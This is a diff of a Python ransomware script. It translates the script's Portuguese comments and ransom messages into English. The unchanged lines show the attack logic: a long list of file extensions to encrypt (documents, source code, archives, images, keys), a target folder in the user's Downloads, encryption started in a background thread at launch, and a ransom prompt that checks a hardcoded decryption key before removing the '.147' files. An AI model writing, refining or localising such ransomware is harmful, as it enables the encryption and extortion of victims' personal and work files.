@@ -5,7 +5,7 @@ import threading
 from pathlib import Path
 
 extensoes_arquivos = ["*.pl","*.7z","*.rar","*.m4a","*.py","*.cpp","*.cs","*.css","*.wma","*.avi","*.wmv","*.d3dbsp","*.sc2save","*.sie","*.sum","*.bkp","*.flv","*.js","*.raw","*.jpeg","*.tar","*.zip","*.tar*.gz","*.cmd","*.key","*.DOT","*.docm","*.txt", "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.jpg", "*.png", "*.csv", "*.sql", "*.mdb", "*.sln", "*.php", "*.asp", "*.aspx", "*.html", "*.xml", "*.psd", "*.bmp"]
-pasta_inicial = Path.home()/"Downloads" # teste
+pasta_inicial = Path.home()/"Downloads" # test folder
 
 def criptografar_arquivos():
     for extensao_arquivo in extensoes_arquivos:
@@ -40,12 +40,12 @@ def descriptografar_arquivos(chave):
         pass
 
 def main():
-    chave = input("[*] Seus arquivos foram criptografados. Para descriptografá-los, insira a chave de descriptografia: ")
+    chave = input("[*] Your files have been encrypted. To decrypt them, please enter the decryption key.: ")
     if chave == 'l1eqybC6EfUwOnxjI4XeimFkdnPPe9jV':
         descriptografar_arquivos(chave)
         for arquivo_criptografado in glob.glob('*.147'):
             os.remove(arquivo_criptografado)
-            print(f'[!] Arquivo descriptografado: {arquivo_criptografado}')
+            print(f'[!] Decrypted file: {arquivo_criptografado}')
 
 threading.Thread(target=criptografar_arquivos).start()
 main()
